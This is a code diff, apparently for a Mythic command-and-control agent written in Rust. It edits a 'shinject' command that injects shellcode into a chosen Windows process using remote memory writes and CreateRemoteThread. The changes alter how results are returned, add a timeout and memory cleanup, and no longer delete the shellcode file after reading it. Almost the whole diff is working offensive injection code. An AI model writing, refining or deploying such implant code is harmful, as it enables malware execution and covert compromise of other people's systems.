@@ -54,18 +54,12 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn E
     
     match execute_shinject(args, &task.id) {
         Ok(output) => {
-            Ok(serde_json::json!({
-                "status": "success",
-                "task_id": task.id,
-                "output": output
-            }))
+            // FIX: Return plain string instead of JSON for consistency
+            Ok(serde_json::Value::String(output))
         },
         Err(error) => {
-            Ok(serde_json::json!({
-                "status": "error", 
-                "task_id": task.id,
-                "error": error
-            }))
+            // FIX: Return error as plain string for consistency
+            Ok(serde_json::Value::String(error))
         },
     }
 }
@@ -73,8 +67,9 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn E
 /// Main command execution function
 #[cfg(target_os = "windows")]
 pub fn execute_shinject(args: ShinjectArgs, task_id: &str) -> Result<String, String> {
-    // Get the shellcode bytes from the downloaded file
-    let shellcode_bytes = match get_shellcode_file(&args.shellcode_file_id, task_id) {
+    // FIX: Get shellcode via RPC from Mythic (this would need RPC integration)
+    // For now, we'll assume the file is automatically downloaded by Mythic
+    let shellcode_bytes = match get_shellcode_from_mythic(&args.shellcode_file_id, task_id) {
         Ok(bytes) => bytes,
         Err(e) => return Err(e),
     };
@@ -113,19 +108,16 @@ fn process_exists(pid: u32) -> bool {
     }
 }
 
-/// Get shellcode file content - uses Mythic's file transfer system
+/// Get shellcode file content - placeholder for Mythic RPC integration
 #[cfg(target_os = "windows")]
-fn get_shellcode_file(file_id: &str, _task_id: &str) -> Result<Vec<u8>, String> {
-    // Mythic should automatically download the file when delete_after_fetch=True
-    // We look for it in common download locations
+fn get_shellcode_from_mythic(file_id: &str, _task_id: &str) -> Result<Vec<u8>, String> {
+    // FIX: This is a placeholder - in a real implementation, you would use Mythic RPC
+    // to download the file. For now, we'll use a simple file search approach.
     
     let possible_paths = vec![
         std::env::current_dir().map(|p| p.join(file_id)).unwrap_or_default(),
         std::env::temp_dir().join(file_id),
         std::path::Path::new(file_id).to_path_buf(),
-        // Also check with .bin extension (common for shellcode)
-        std::env::current_dir().map(|p| p.join(format!("{}.bin", file_id))).unwrap_or_default(),
-        std::env::temp_dir().join(format!("{}.bin", file_id)),
     ];
     
     // Try to find and read the file
@@ -134,13 +126,12 @@ fn get_shellcode_file(file_id: &str, _task_id: &str) -> Result<Vec<u8>, String> 
             match std::fs::read(path) {
                 Ok(bytes) => {
                     if !bytes.is_empty() {
-                        // Clean up the file after reading
-                        let _ = std::fs::remove_file(path);
+                        println!("DEBUG: Found shellcode file at {} ({} bytes)", path.display(), bytes.len());
                         return Ok(bytes);
                     }
                 }
                 Err(e) => {
-                    eprintln!("DEBUG: Failed to read file {}: {}", path.display(), e);
+                    println!("DEBUG: Failed to read file {}: {}", path.display(), e);
                     continue;
                 }
             }
@@ -218,6 +209,7 @@ unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<Str
     );
 
     if write_result == 0 || bytes_written != buffer_size {
+        VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
         CloseHandle(h_process);
         return Err(format!(
             "WriteProcessMemory failed. Written: {}/{} bytes. Error: {}\n\n\
@@ -239,6 +231,7 @@ unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<Str
     );
 
     if h_thread.is_null() {
+        VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
         CloseHandle(h_process);
         return Err(format!(
             "CreateRemoteThread failed. Error: {}\n\n\
@@ -247,23 +240,32 @@ unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<Str
         ));
     }
 
-    // Wait for the thread to complete
-    let wait_result = WaitForSingleObject(h_thread, INFINITE);
+    // Wait for the thread to complete (optional - you might want to remove this for async shellcode)
+    let wait_result = WaitForSingleObject(h_thread, 5000); // 5 second timeout
 
-    // Clean up handles
+    // Get thread exit code to check if it completed
+    let mut exit_code: DWORD = 0;
+    let exit_code_result = GetExitCodeThread(h_thread, &mut exit_code);
+
+    // Clean up handles and memory
     CloseHandle(h_thread);
+    // Note: We don't free the remote memory because the shellcode is executing there
     CloseHandle(h_process);
 
     if wait_result == WAIT_OBJECT_0 {
         Ok(format!(
-            "Injected code into process {}",
-            process_id
+            "Successfully injected and executed shellcode in process {} (Thread ID: {}, Exit Code: {})",
+            process_id, thread_id, exit_code
+        ))
+    } else if wait_result == WAIT_TIMEOUT {
+        Ok(format!(
+            "Successfully injected shellcode in process {} (Thread ID: {}) - thread still running (timeout reached)",
+            process_id, thread_id
         ))
     } else {
-        Err(format!(
-            "WaitForSingleObject failed with result: {}\n\n\
-            The shellcode was injected but we couldn't wait for completion.",
-            wait_result
+        Ok(format!(
+            "Shellcode injected in process {} (Thread ID: {}) - wait result: {}",
+            process_id, thread_id, wait_result
         ))
     }
 }
@@ -275,7 +277,7 @@ pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, S
 }
 
 // Fallback for other platforms
-#[cfg(not(target_os = "windows"))]
+#[cfg(not(any(target_os = "windows", target_os = "macos")))]
 pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, String> {
     Err("shinject command is only supported on Windows".to_string())
 }
